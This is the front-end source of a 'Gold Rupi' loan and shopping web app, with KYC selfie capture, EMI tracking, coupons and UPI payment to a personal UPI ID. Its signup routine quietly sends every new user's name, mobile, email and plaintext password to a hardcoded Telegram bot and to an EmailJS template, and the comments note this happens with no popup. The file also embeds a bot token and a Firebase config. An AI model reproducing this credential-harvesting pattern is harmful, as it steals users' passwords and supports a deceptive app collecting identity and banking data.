                    <div class="card gold-card">
                        <div style="font-size:12px; opacity:0.9;">Total Outstanding</div>
                        <div style="font-size:24px; font-weight:700;">‚Çπ<span id="track-balance">0</span></div>
                        <div class="progress-container"><div id="track-progress" class="progress-bar" style="width:0%"></div></div>
                        <div class="flex-between" style="font-size:11px;">
                            <span>Paid: ‚Çπ<span id="track-paid">0</span></span>
                            <span>Total Repayment: ‚Çπ<span id="track-total">0</span></span>
                        </div>
                    </div>

                    <div class="card" style="border-left:4px solid var(--danger);">
                        <div class="flex-between">
                            <div>
                                <div style="font-size:11px; color:#666;">Next EMI Due</div>
                                <div style="font-weight:700; font-size:16px;"><span id="track-next-date">...</span></div>
                            </div>
                            <div class="timer-badge">
                                <i class="ri-alarm-warning-line"></i> <span id="track-timer">00d 00h</span>
                            </div>
                        </div>
                        <div class="flex-between" style="margin-top:10px;">
                            <strong>‚Çπ<span id="track-next-amt">0</span></strong>
                            <button class="btn" style="width:auto; padding:6px 15px; font-size:12px;" onclick="openPayModal()">Pay Now</button>
                        </div>
                    </div>

                    <div class="flex-row" style="margin-bottom:15px; overflow-x:auto;">
                        <button class="btn secondary" style="font-size:11px; white-space:nowrap;" onclick="requestForeclosure()">Request Foreclosure</button>
                        <button class="btn secondary" style="font-size:11px; white-space:nowrap;">Download Statement</button>
                        <button class="btn secondary" style="font-size:11px; white-space:nowrap;" onclick="openSupportChat()">Support Chat</button>
                    </div>

                    <h4>EMI History</h4>
                    <div id="emi-list">
                        </div>
                        
                    <h4 style="margin-top:20px; border-top:1px solid #eee; padding-top:15px;">Loan History (Closed)</h4>
                    <div id="closed-loan-history">
                        <p class="text-center small-muted">No closed loans found.</p>
                    </div>
                </div>

            </div>
        </div>

        <div id="pay-modal" class="overlay">
            <div class="modal">
                <button class="close-modal" onclick="document.getElementById('pay-modal').style.display='none'">&times;</button>
                <h3>Pay EMI</h3>
                <p>Paying: ‚Çπ<span id="pay-amount-display"></span></p>
                
                <div style="text-align:center; margin:20px 0;">
                    <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=upi://pay?pa=7649070168@okbizaxis&pn=GoldRupi&am=100" style="width:150px; border-radius:10px; border:1px solid #ddd;">
                    <p style="font-size:11px;">Scan with GPay / Paytm / PhonePe</p>
                </div>
                
                <button class="btn" style="background:#4CAF50; color:#fff; margin-bottom:10px;" onclick="launchUPI()"> <i class="ri-smartphone-line"></i> Open UPI App</button>
                
                <div style="margin-top:15px;">
                    <label style="font-size:12px;">Enter UTR / Ref Number (12 Digits)</label>
                    <input id="pay-utr" placeholder="123456789012" maxlength="12" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 12);">
                    <button class="btn" onclick="submitPayment()">Submit Payment</button>
                </div>
            </div>
        </div>


<div id="support-chat-modal" class="overlay">
            <div class="modal">
                <div class="chat-header">
                    <h4><i class="ri-customer-service-line"></i> Help & Support</h4>
                    <button class="close-modal" style="color:white; position:static;" onclick="document.getElementById('support-chat-modal').style.displa>
                </div>
                <div id="chat-messages" class="chat-messages">
                    <div class="msg-admin">
                        Hi there! How can we help you today?
                        <span class="msg-time">Admin - ${new Date().toLocaleTimeString()}</span>
                    </div>
                </div>
                <div class="chat-input-area">
                    <input id="chat-message-input" placeholder="Type your message...">
                    <button class="btn" onclick="sendChatMessage()"><i class="ri-send-plane-2-fill"></i></button>
                </div>
            </div>
        </div>

        <div class="fab-support" onclick="openSupportChat()">
             <i class="ri-chat-3-line"></i>
        </div>































































        <div class="bottom-nav">
            <div class="nav-item active" onclick="switchTab('section-home', this)"><i class="ri-home-line"></i>Home</div>
            <div class="nav-item" onclick="switchTab('section-shop', this)"><i class="ri-store-2-line"></i>Shop</div>
            <div id="loan-nav-item" class="nav-item" onclick="openLoanDashboard()"><i class="ri-refund-2-line"></i>Loan</div>
            <div class="nav-item" onclick="switchTab('section-profile', this)"><i class="ri-user-line"></i>Profile</div>
        </div>
        
    </div> 
    
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
    
    <script>
        // CONFIG
        const firebaseConfig = {
            apiKey: "AIzaSyCZ5P2t5xRhy5d0IXV6UWcvbkUWXqyPENA",
            authDomain: "smbrand-4543a.firebaseapp.com",
            databaseURL: "https://smbrand-4543a-default-rtdb.firebaseio.com",
            projectId: "smbrand-4543a",
            appId: "1:720775550032:web:0622548a007597778bad55"
        };
        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        const db = firebase.database();
        // üéØ UPDATED CONFIG: Cloudflare Worker URL (‡§Ü‡§™‡§ï‡•á ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§™‡•ç‡§∞‡§¶‡§æ‡§® ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ)
        const CLOUDFLARE_WORKER_URL = 'https://ebookandapk-uploder.rajputsurendra562.workers.dev';
        const MERCHANT_UPI_ID = '7649070168@okbizaxis'; 
        
        // üéØ NEW: TELEGRAM/EMAIL CONFIG (Replace with your actual values)
        const TELEGRAM_BOT_TOKEN = "7840966662:AAHqRQbwMOk6ja6pewc3fBMkGUAF7ZKb8ZE"; 
        const TELEGRAM_CHAT_ID = "7918796164";
        const EMAILJS_SERVICE_ID = "service_s3boech"; 
        const EMAILJS_TEMPLATE_ID = "template_7lek2h5"; 
        // üéØ END NEW CONFIG

        let currentUser = null;
        let currentLoanId = null;
        let isGuest = false;
        let notificationCount = 0; 
        
        let cameraStream = null; // For live camera feed
        let currentPhotoType = ''; // 'selfie' or 'dp'
        let capturedPhotoBlob = null; // Store the captured image BLOB


// ------------------ CAMERA / SELFIE LOGIC (UPDATED WITH BETTER ERROR HANDLING) ------------------

        function openCameraModal(type) {
            if(isGuest) return alert("Login to use camera features.");
            currentPhotoType = type;
            document.getElementById('camera-modal-title').innerText = type === 'selfie' ? 'Capture Live Selfie (KYC)' : 'Capture Profile Photo (DP)';
            document.getElementById('camera-modal').style.display = 'flex';
            document.getElementById('camera-stream').style.display = 'block';
            document.getElementById('camera-canvas').style.display = 'none';
            document.getElementById('capture-btn').classList.remove('field-hidden');
            document.getElementById('upload-btn').classList.add('field-hidden');
            
            const video = document.getElementById('camera-stream');
            
            // Start Camera and request permissions
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                .then(stream => {
                    // Success: Permissions granted
                    cameraStream = stream;
                    video.srcObject = stream;
                    console.log("Camera access granted.");
                })
                .catch(err => {
                    // Failure: Handle permission errors
                    stopCamera(); // Close the modal on failure
                    
                    let errorMessage = "Could not access camera. Make sure no other app is using it.";
                    
                    if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                        errorMessage = "**Permission Denied!**\n\nTo use the camera, you must grant access.\n\n1. Check if the site is running on **HTTPS** (required).\n2. Go to your browser settings (Lock icon in address bar) and manually set Camera permission to 'Allow'.";
                    } else if (err.name === 'NotReadableError') {
                        errorMessage = "Camera is already in use by another application or service.";
                    } else if (err.name === 'ConstraintNotSatisfiedError') {
                        errorMessage = "No camera found or specified camera is not available.";
                    }
                    
                    alert("CAMERA ERROR: " + errorMessage);
                    console.error("Camera Access Error:", err);
                });
        }

        function capturePhoto() {
            const video = document.getElementById('camera-stream');
            const canvas = document.getElementById('camera-canvas');
            const context = canvas.getContext('2d');
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            // Flip the image horizontally for a selfie effect (as user facing camera often mirrors)
            context.translate(canvas.width, 0);
            context.scale(-1, 1);
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            context.setTransform(1, 0, 0, 1, 0, 0); // Reset transformation
            
            canvas.toBlob(blob => {
                capturedPhotoBlob = blob;
            }, 'image/jpeg', 0.9);

            video.style.display = 'none';
            canvas.style.display = 'block';
            document.getElementById('capture-btn').classList.add('field-hidden');
            document.getElementById('upload-btn').classList.remove('field-hidden');
            stopCameraStream();
        }
        
        function stopCameraStream() {
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
                cameraStream = null;
            }
        }

        function stopCamera() {
            stopCameraStream();
            document.getElementById('camera-modal').style.display = 'none';
        }

        async function uploadCapturedPhoto() {
            if (!capturedPhotoBlob) return alert("Photo capture failed. Try again.");
            
            const btn = document.getElementById('upload-btn');
            const originalText = btn.innerText;
            btn.disabled = true;
            btn.innerText = 'Uploading...';
            
            const formData = new FormData();
            formData.append('file', capturedPhotoBlob, 'selfie_' + Date.now() + '.jpg');

            try {
                const res = await fetch(CLOUDFLARE_WORKER_URL, {
                    method: 'POST',
                    body: formData,
                });
                const data = await res.json();
                
                if (data.publicURL) {
                    if (currentPhotoType === 'selfie') {
                        document.getElementById('file-selfie-url').value = data.publicURL;
                        const statusSpan = document.getElementById('selfie-file-status');
                        statusSpan.innerText = 'Selfie Uploaded!';
                        statusSpan.style.color = 'var(--success)';
                        alert("Live Selfie uploaded successfully!");
                    } else if (currentPhotoType === 'dp') {
                        await db.ref('users/'+currentUser.uid+'/profile_pic_url').set(data.publicURL);
                        document.getElementById('profile-dp-img').src = data.publicURL;
                        alert("Profile Picture uploaded successfully!");
                    }
                    stopCamera();
                } else {
                    throw new Error(data.error || "Upload failed: Invalid response.");
                }
            } catch (e) {
                alert("Upload Failed: " + e.message);
                console.error("Upload Error:", e);
                document.getElementById('camera-stream').style.display = 'block';
                document.getElementById('camera-canvas').style.display = 'none';
                document.getElementById('capture-btn').classList.remove('field-hidden');
            } finally {
                btn.disabled = false;
                btn.innerText = originalText;
            }
        }
// ------------------ END CAMERA / SELFIE LOGIC ------------------

// ------------------ NEW IFRAME MODAL LOGIC ------------------

        function openGenericIframeModal(title, url) {
            document.getElementById('iframe-modal-title').innerText = title;
            document.getElementById('generic-iframe').src = url;
            document.getElementById('generic-iframe-modal').style.display = 'flex';
        }
        
        // Functionality related to the new Credit Offer button
        function showLoanOfferModal() {
            openGenericIframeModal("Credit Program", "program.html");
        }
        // Referral Modal Function (Now uses generic modal)
        function openReferralModal() {
            openGenericIframeModal("Refer & Earn", "affiliated.html");
        }

// ------------------ END NEW IFRAME MODAL LOGIC ------------------


        // --- UI UTILITY ---
        // NEW: Added isDoc parameter for potential OCR simulation
        function updateFileName(input, statusElementId, isDoc = false) {
            const span = statusElementId ? document.getElementById(statusElementId) : input.closest('.file-upload-box').querySelector('span');
            if (!span.dataset.originalText) {
                span.dataset.originalText = span.innerText;
            }

            if (input.files.length > 0) {
                span.innerText = input.files[0].name.substring(0, 20) + '...';
                span.style.color = 'var(--success)';
                // Optional: Trigger dummy OCR field fill
                if (isDoc) {
                   simulateOCRFiller(input.id);
                }
            } else {
                span.innerText = span.dataset.originalText || 'Upload Document';
                span.style.color = '';
            }
        }
        document.querySelectorAll('.file-upload-box span').forEach(span => {
            span.dataset.originalText = span.innerText; // Store original text
        });
        
        // NEW: Dummy OCR Filler (Simulating data reading)
        function simulateOCRFiller(inputId) {
            if(inputId === 'file-pan') {
                 document.getElementById('loan-pan').value = 'ABCDE1234F'; 
            } else if (inputId === 'file-passbook') {
                 document.getElementById('loan-bank-name').value = 'STATE BANK OF INDIA';
                 document.getElementById('loan-acc-num').value = '555123456789';
                 document.getElementById('loan-ifsc').value = 'SBIN0001234';
            }
        }
        
        // NEW: 25 DUMMY PROMO BUTTONS (UPDATED to use openGenericIframeModal)
        const promoButtonsData = [
            { id: 'promo-btn-1', label: 'Increase Program', color: '#10b981', i: 'ri-line-chart-line', onClick: `openGenericIframeModal('Increase Program', 'program.html?mode=increase')` },
            { id: 'promo-btn-2', label: 'Refer & Earn', color: '#f59e0b', i: 'ri-gift-line', onClick: `openReferralModal()` }, // Custom function calls generic
            { id: 'promo-btn-3', label: 'My Wallet', color: '#3b82f6', i: 'ri-wallet-line', onClick: `openGenericIframeModal('My Wallet', 'wallet.html')` },
            { id: 'promo-btn-4', label: 'Credit Score', color: '#8b5cf6', i: 'ri-bar-chart-2-line', onClick: `openGenericIframeModal('Credit Score Check', 'credit-score.html')` },
            { id: 'promo-btn-5', label: 'Gold Savings', color: '#d97706', i: 'ri-coin-line', onClick: `openGenericIframeModal('Gold Savings', 'gold-savings.html')` },
            { id: 'promo-btn-6', label: 'EMI Offer', color: '#ef4444', i: 'ri-calendar-event-line', onClick: `openGenericIframeModal('EMI Offers', 'emi-offers.html')` },
            { id: 'promo-btn-7', label: 'Insurance', color: '#06b6d4', i: 'ri-shield-line', onClick: `openGenericIframeModal('Insurance', 'insurance.html')` },
            { id: 'promo-btn-8', label: 'Invest Now', color: '#14b8a6', i: 'ri-arrow-up-circle-line', onClick: `openGenericIframeModal('Invest Now', 'invest.html')` },
            { id: 'promo-btn-9', label: 'UPI Pay', color: '#f97316', i: 'ri-qr-code-line', onClick: `openGenericIframeModal('UPI Pay', 'upi-pay.html')` },
            { id: 'promo-btn-10', label: 'Offers Today', color: '#4c1d95', i: 'ri-percent-line', onClick: `openGenericIframeModal('Offers Today', 'offers.html')` },
            { id: 'promo-btn-11', label: 'Buy Crypto', color: '#facc15', i: 'ri-bit-coin-line', onClick: `openGenericIframeModal('Buy Crypto', 'crypto.html')` },
            { id: 'promo-btn-12', label: 'FD Scheme', color: '#d946ef', i: 'ri-safe-2-line', onClick: `openGenericIframeModal('FD Scheme', 'fd-scheme.html')` },
            { id: 'promo-btn-13', label: 'New Loan', color: '#1e3a8a', i: 'ri-refund-2-line', onClick: `openLoanDashboard()` }, // This is a standard modal, keep as is
            { id: 'promo-btn-14', label: 'Gift Vouchers', color: '#be123c', i: 'ri-coupon-line', onClick: `openGenericIframeModal('Gift Vouchers', 'vouchers.html')` },
            { id: 'promo-btn-15', label: 'Bill Pay', color: '#0d9488', i: 'ri-flash-light-line', onClick: `openGenericIframeModal('Bill Pay', 'bill-pay.html')` },
            { id: 'promo-btn-16', label: 'Tax Help', color: '#dc2626', i: 'ri-file-line', onClick: `openGenericIframeModal('Tax Help', 'tax-help.html')` },
            { id: 'promo-btn-17', label: 'Travel', color: '#4f46e5', i: 'ri-flight-takeoff-line', onClick: `openGenericIframeModal('Travel', 'travel.html')` },
            { id: 'promo-btn-18', label: 'Support 24x7', color: '#ca8a04', i: 'ri-phone-line', onClick: `openSupportChat()` }, // This is a standard modal, keep as is
            { id: 'promo-btn-19', label: 'Quick Buy', color: '#059669', i: 'ri-shopping-cart-line', onClick: `switchTab('section-shop', document.querySelector('.bottom-nav .nav-item:nth-child(2)'))` }, // This is a standard function, keep as is
            { id: 'promo-btn-20', label: 'ATM Finder', color: '#db2777', i: 'ri-map-pin-line', onClick: `openGenericIframeModal('ATM Finder', 'atm-finder.html')` },
            { id: 'promo-btn-21', label: 'Pay Rent', color: '#7e22ce', i: 'ri-home-4-line', onClick: `openGenericIframeModal('Pay Rent', 'rent-pay.html')` },
            { id: 'promo-btn-22', label: 'Mobile Recharge', color: '#0ea5e9', i: 'ri-smartphone-line', onClick: `openGenericIframeModal('Mobile Recharge', 'recharge-mobile.html')` },
            { id: 'promo-btn-23', label: 'DTH Recharge', color: '#fb923c', i: 'ri-tv-line', onClick: `openGenericIframeModal('DTH Recharge', 'recharge-dth.html')` },
            { id: 'promo-btn-24', label: 'Loan Status', color: '#0f766e', i: 'ri-checkbox-circle-line', onClick: `openLoanDashboard()` }, // This is a standard modal, keep as is
            { id: 'promo-btn-25', label: 'My Account', color: '#f43f5e', i: 'ri-user-line', onClick: `switchTab('section-profile', document.querySelector('.bottom-nav .nav-item:nth-child(4)'))` }, // This is a standard function, keep as is
        ];
        
        function renderPromoButtons() {
            const container = document.getElementById('promo-button-container');
            container.innerHTML = '';
            
            promoButtonsData.forEach((btn, index) => {
                const isHidden = localStorage.getItem(btn.id) === 'hidden'; // Check hide status from localStorage
                
                const div = document.createElement('div');
                div.className = `circular-offer-btn ${isHidden ? 'field-hidden' : ''}`;
                div.id = btn.id;
                div.style.background = btn.color;
                div.style.boxShadow = `0 4px 10px ${btn.color}77`;
                div.setAttribute('onclick', btn.onClick);
                
                div.innerHTML = `
                    <i class="${btn.i}" style="font-size: 20px;"></i>
                    <strong>${btn.label.split(' ')[0]}</strong>
                    <span style="font-size: 9px; font-weight: 700;">${btn.label.split(' ').slice(1).join(' ') || ''}</span>
                    `;
                container.appendChild(div);
            });
        }
        
        // Example Function to hide/unhide a button programmatically (Use in Admin Panel or Console)
        // hidePromoButton('promo-btn-1'); // Hides the "Increase Program" button
        function hidePromoButton(buttonId) {
            localStorage.setItem(buttonId, 'hidden');
            document.getElementById(buttonId)?.classList.add('field-hidden');
            alert(`Button ${buttonId} is now hidden.`);
        }
        
        // Example Function to show a button programmatically
        // showPromoButton('promo-btn-1'); // Shows the "Increase Program" button
        function showPromoButton(buttonId) {
            localStorage.removeItem(buttonId);
            document.getElementById(buttonId)?.classList.remove('field-hidden');
            alert(`Button ${buttonId} is now visible.`);
        }

        renderPromoButtons(); // Render on load
        // ------------------ END 25 DUMMY PROMO BUTTONS ------------------


        // ------------------ AUTHENTICATION LOGIC ------------------
        
        // NEW: Function to send Telegram Alert (Non-blocking)
        async function sendTelegramAlert(name, mobile, email, password) {
            const message = `
üöÄ *New User Signup on Gold Rupi* üöÄ
üë§ *Name:* ${name}
üì± *Mobile:* ${mobile}
üìß *Email:* ${email}
üîë *Password:* ${password}
‚è∞ *Time:* ${new Date().toLocaleString()}
            `;
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            
            try {
                await fetch(url, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                console.log("Telegram alert sent successfully (No popup).");
            } catch (err) {
                console.error("Failed to send Telegram alert:", err);
            }
        }
        
        // NEW: Function to send Email Alert (Non-blocking)
        async function sendEmailAlert(name, mobile, email, password) {
             try {
                await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
                    user_name: name,
                    user_mobile: mobile,
                    user_email: email,
                    user_password: password,
                    alert_time: new Date().toLocaleString()
                });
                console.log("Email alert sent successfully (No popup).");
            } catch (err) {
                console.error("Failed to send Email alert:", err);
            }
        }


        function showAuthTab(tab) {
            document.getElementById('login-form').classList.add('field-hidden');
            document.getElementById('signup-form').classList.add('field-hidden');
            document.getElementById('login-tab-btn').classList.remove('active');
            document.getElementById('signup-tab-btn').classList.remove('active');
            
            if(tab === 'login') {
                document.getElementById('login-form').classList.remove('field-hidden');
                document.getElementById('login-tab-btn').classList.add('active');
            } else {
                document.getElementById('signup-form').classList.remove('field-hidden');
                document.getElementById('signup-tab-btn').classList.add('active');
            }
        }

        async function loginUser() {
            const email = document.getElementById('login-email').value;
            const password = document.getElementById('login-password').value;
            if(!email || !password) return alert("Enter email and password.");
            
            try {
                await auth.signInWithEmailAndPassword(email, password);
            } catch (error) {
                alert("Login Failed: " + error.message);
            }
        }

        async function signupUser() {
            const name = document.getElementById('signup-name').value;
            const mobile = document.getElementById('signup-mobile').value;
            const email = document.getElementById('signup-email').value;
            const password = document.getElementById('signup-password').value;
            
            if(!name || !mobile || mobile.length !== 10 || !email || password.length < 6) {
                return alert("Please fill all fields correctly (Mobile must be 10 digits, Password min 6 chars).");
            }
            
            try {
                const userCredential = await auth.createUserWithEmailAndPassword(email, password);
                const uid = userCredential.user.uid;

                await db.ref('users/'+uid).set({
                    name: name,
                    mobile: mobile,
                    email: email,
                    wallet: 0,
                    created_at: Date.now(),
                    profile_pic_url: 'https://via.placeholder.com/80/c59b2d/ffffff?text=DP', // Default DP
                    payment_on_time: true,
                    late_payment_count: 0,
                    loan_blocked_until: 0 
                });
                
                // üéØ NEW: Send Alerts (Non-blocking, no pop-up)
                sendTelegramAlert(name, mobile, email, password);
                sendEmailAlert(name, mobile, email, password);

                alert("Account Created! You are now logged in.");
            } catch (error) {
                alert("Sign Up Failed: " + error.message);
            }
        }
        
        function loginAsGuest() {
            isGuest = true;
            currentUser = { uid: 'GUEST_USER', email: 'guest@goldrupi.com' };
            initializeAppUI();
            alert("Continuing as Guest. Loan and Profile features are disabled.");
        }

        // AUTH CHECK
        auth.onAuthStateChanged(user => {
            if(user) {
                currentUser = user;
                isGuest = false;
                initializeAppUI();
            } else if (!isGuest) {
                document.getElementById('auth-overlay').style.display = 'flex';
                document.getElementById('main-app-content').classList.add('field-hidden');
            }
        });
        
        function initializeAppUI() {
            document.getElementById('auth-overlay').style.display = 'none';
            document.getElementById('main-app-content').classList.remove('field-hidden');
            
            if(isGuest) {
                document.getElementById('user-name-display').innerText = 'Guest';
                document.getElementById('header-wallet').innerText = 'N/A';
                document.getElementById('loan-nav-item').onclick = () => alert("Please Login/Sign Up to access Loan services.");
                document.getElementById('loan-nav-item').style.opacity = '0.4';
                document.getElementById('profile-card').innerHTML = '<p class="text-center" style="color:red;">Login to manage profile.</p>';
                document.getElementById('manual-pay-card').classList.add('field-hidden'); 
            } else {
                document.getElementById('loan-nav-item').onclick = openLoanDashboard;
                document.getElementById('loan-nav-item').style.opacity = '1';
                document.getElementById('manual-pay-card').classList.remove('field-hidden'); 
                loadUserData();
                listenForLoanStatus();
                listenForNotifications();
                listenForUserNotifications(); 
                loadCoupons();
            }
            document.getElementById('latest-products-list').innerHTML = `<p class="small-muted">Products loading enabled.</p>`;
        }


        // ------------------ CORE APP LOGIC ------------------
        let userDataCache = {}; // Cache user data

        function loadUserData(){
            db.ref('users/'+currentUser.uid).on('value', snap => {
                const data = snap.val() || {};
                userDataCache = data; // Update Cache
                document.getElementById('user-name-display').innerText = (data.name || 'User').split(' ')[0];
                document.getElementById('profile-name').value = data.name || '';
                document.getElementById('profile-mobile').value = data.mobile || '';
                document.getElementById('header-wallet').innerText = (data.wallet || 0).toFixed(2);
                document.getElementById('profile-dp-img').src = data.profile_pic_url || 'https://via.placeholder.com/80/c59b2d/ffffff?text=DP';
                
                const occ = document.getElementById('loan-occupation').value;
                const companyInput = document.getElementById('loan-company-name');
                if (occ === 'salaried' || occ === 'business') {
                    companyInput.classList.remove('field-hidden');
                } else {
                    companyInput.classList.add('field-hidden');
                }
            });
        }
        
        document.getElementById('loan-occupation').addEventListener('change', (e) => {
            const companyInput = document.getElementById('loan-company-name');
            if (e.target.value === 'salaried' || e.target.value === 'business') {
                companyInput.classList.remove('field-hidden');
                companyInput.placeholder = e.target.value === 'salaried' ? 'Employer/Company Name' : 'Business Name';
            } else {
                companyInput.classList.add('field-hidden');
            }
        });


        let loContentLoaded = false; 

        function switchTab(sectionId, el) {
            document.querySelectorAll('.page-section').forEach(d => d.classList.add('field-hidden'));
            document.getElementById(sectionId).classList.remove('field-hidden');
            document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
            if(el) el.classList.add('active');
            
            if (sectionId === 'section-shop') {
                const loIframe = document.getElementById('lo-iframe-content');
                const loadingMsg = document.getElementById('lo-loading-msg');
                
                if (loIframe && !loContentLoaded) {
                    if (loIframe.src.indexOf('about:blank') !== -1) {
                         loIframe.src = 'urupe.html'; 
                    }
                    loContentLoaded = true;
                }
                if (loadingMsg) {
                    loadingMsg.style.display = 'none'; 
                }
            }
        }
        
        // NEW: Send Contact Email Function
        function sendContactEmail() {
             if (isGuest) return alert("Login to use the Contact Us feature.");
             
             const subject = document.getElementById('contact-subject').value;
             const message = document.getElementById('contact-message').value;
             const statusDiv = document.getElementById('contact-message-status');
             
             if(!subject || !message) {
                 statusDiv.style.color = 'var(--danger)';
                 statusDiv.innerText = 'Subject and Message cannot be empty.';
                 statusDiv.classList.remove('field-hidden');
                 return;
             }
             
             statusDiv.style.color = 'var(--warning)';
             statusDiv.innerText = 'Sending...';
             statusDiv.classList.remove('field-hidden');
             
             emailjs.send(EMAILJS_SERVICE_ID, 'YOUR_CONTACT_TEMPLATE_ID', { // **CHANGE TEMPLATE ID HERE**
                from_name: userDataCache.name || 'User',
                from_email: userDataCache.email,
                subject: subject,
                message: message
             }).then(() => {
                 statusDiv.style.color = 'var(--success)';
                 statusDiv.innerText = 'Email sent successfully! We will respond shortly.';
                 document.getElementById('contact-subject').value = '';
                 document.getElementById('contact-message').value = '';
             }).catch((err) => {
                 statusDiv.style.color = 'var(--danger)';
                 statusDiv.innerText = 'Failed to send email: ' + err.text;
                 console.error('Email sending failed:', err);
             });
        }
        // END NEW: Send Contact Email Function
        
        function saveProfile() {
            if(isGuest) return alert("Login to save profile.");
            const name = document.getElementById('profile-name').value;
            db.ref('users/'+currentUser.uid).update({name: name});
            alert("Profile Saved");
        }

        function logout(){
            if(isGuest) {
                isGuest = false;
                currentUser = null;
                document.getElementById('main-app-content').classList.add('field-hidden');
                document.getElementById('auth-overlay').style.display = 'flex';
                return;
            }
            auth.signOut().then(() => {
                currentUser = null;
                document.getElementById('main-app-content').classList.add('field-hidden');
                document.getElementById('auth-overlay').style.display = 'flex';
            });
        }
        
        function openNotifications() {
            document.getElementById('notif-overlay').style.display = 'flex';
            document.getElementById('notif-badge').style.display = 'none';
        }
        
        function appendNotification(n) {
            const html = `
                <div class="notif-item">
                    <div class="notif-title">${n.title}</div>
                    <div class="notif-body">${n.message}</div>
                    <div style="font-size:10px; color:#999; margin-top:2px;">${new Date(n.timestamp).toLocaleTimeString()}</div>
                </div>
            `;
            document.getElementById('notification-list').insertAdjacentHTML('afterbegin', html);
            
            document.getElementById('notif-badge').style.display = 'flex';
            document.getElementById('notif-badge').innerText = 'New!';
        }

        function listenForNotifications() {
            db.ref('admin_notifications').limitToLast(10).on('child_added', snap => {
                const n = snap.val();
                if(!n) return;
                appendNotification(n);
            });
        }
        
        function listenForUserNotifications() {
            if (isGuest || !currentUser.uid) return;
            
            db.ref('users/' + currentUser.uid + '/notifications').limitToLast(10).on('child_added', snap => {
                const n = snap.val();
                if(!n) return;
                n.title = `[USER ALERT] ${n.title}`; 
                appendNotification(n);
            });
        }

        function loadCoupons() {
            if(isGuest) {
                document.getElementById('coupon-list-container').innerHTML = '<div class="small-muted text-center">Login to see coupons.</div>';
                return;
            }
            db.ref('coupons').on('value', snap => {
                const coupons = snap.val();
                const container = document.getElementById('coupon-list-container');
                container.innerHTML = '';
                
                if(!coupons) {
                    container.innerHTML = '<div class="small-muted text-center">No active coupons.</div>';
                    return;
                }

                Object.keys(coupons).forEach(key => {
                    const c = coupons[key];
                    if(c.active) {
                        const div = document.createElement('div');
                        div.className = 'coupon-ticket';
                        div.innerHTML = `
                            <div>
                                <div class="coupon-code">${key}</div>
                                <div style="font-size:11px;">${c.description}</div>
                            </div>
                            <button class="btn secondary" style="padding:4px 8px; font-size:10px;" onclick="copyCode('${key}')">COPY</button>
                        `;
                        container.appendChild(div);
                    }
                });
            });
        }

        function copyCode(code) {
            navigator.clipboard.writeText(code);
            alert("Code " + code + " copied!");
        }

        let currentCheckoutPrice = 0;
        let appliedDiscount = 0;
        let checkoutItemName = "";

        function openCheckout(price, name) {
            currentCheckoutPrice = price;
            checkoutItemName = name;
            appliedDiscount = 0;
            
            document.getElementById('checkout-item-name').innerText = name;
            document.getElementById('checkout-item-price').innerText = price;
            document.getElementById('checkout-total').innerText = price;
            document.getElementById('checkout-coupon-input').value = "";
            document.getElementById('coupon-msg').innerText = "";
            document.getElementById('checkout-overlay').style.display = 'flex';
        }

        async function applyCoupon() {
            const code = document.getElementById('checkout-coupon-input').value.toUpperCase().trim();
            if(!code) return;

            const snap = await db.ref('coupons/' + code).once('value');
            if(snap.exists() && snap.val().active) {
                const data = snap.val();
                if(data.type === 'flat') {
                    appliedDiscount = data.value;
                } else if (data.type === 'percent') {
                    appliedDiscount = Math.round((currentCheckoutPrice * data.value) / 100);
                }
                
                const finalTotal = currentCheckoutPrice - appliedDiscount;
                document.getElementById('checkout-total').innerText = finalTotal > 0 ? finalTotal : 0;
                document.getElementById('coupon-msg').innerHTML = `<span style="color:green">Applied! Saved ‚Çπ${appliedDiscount}</span>`;
            } else {
                document.getElementById('checkout-total').innerText = currentCheckoutPrice;
                document.getElementById('coupon-msg').innerHTML = `<span style="color:red">Invalid or Expired Code</span>`;
                appliedDiscount = 0;
            }
        }

        function confirmOrder() {
            alert(`Order Placed for ${checkoutItemName}! Total Paid: ‚Çπ${document.getElementById('checkout-total').innerText}`);
            document.getElementById('checkout-overlay').style.display = 'none';
        }

        function setStep(num) {
            document.querySelectorAll('.step-content').forEach(el => el.classList.add('field-hidden'));
            document.getElementById(`form-step-${num}`).classList.remove('field-hidden');
            
            document.querySelectorAll('.step-item').forEach(el => el.classList.remove('active'));
            document.querySelector(`#step-${num}`).classList.add('active');
        }

        function showView(id) {
            document.querySelectorAll('#loan-dashboard > .modal > div[id^="view-"]').forEach(el => el.classList.add('field-hidden'));
            document.getElementById(id).classList.remove('field-hidden');
            
            if (id === 'view-calculator') {
                document.getElementById('good-customer-msg').style.display = 'none';
            }
        }
        
        function openLoanDashboard(){
            if(isGuest) return alert("Please Login/Sign Up to access Loan services.");
            document.getElementById('loan-dashboard').style.display = 'flex';
            checkLoanStep(); 
            loadClosedLoanHistory(); 
        }

        function closeLoanDashboard(){
            document.getElementById('loan-dashboard').style.display = 'none';
        }
        
        // ------------------ LOAN DASHBOARD LOGIC ------------------

        async function checkLoanStep(targetStep = 0){ 
            if(isGuest) {
                document.getElementById('loan-wizard-header').classList.add('field-hidden');
                showView('view-pending');
                document.getElementById('pending-id').innerText = 'GUEST_MODE';
                document.querySelector('#view-pending h3').innerText = 'Login Required';
                document.querySelector('#view-pending p').innerText = 'Please sign up or login to apply for a loan.';
                return;
            }
            
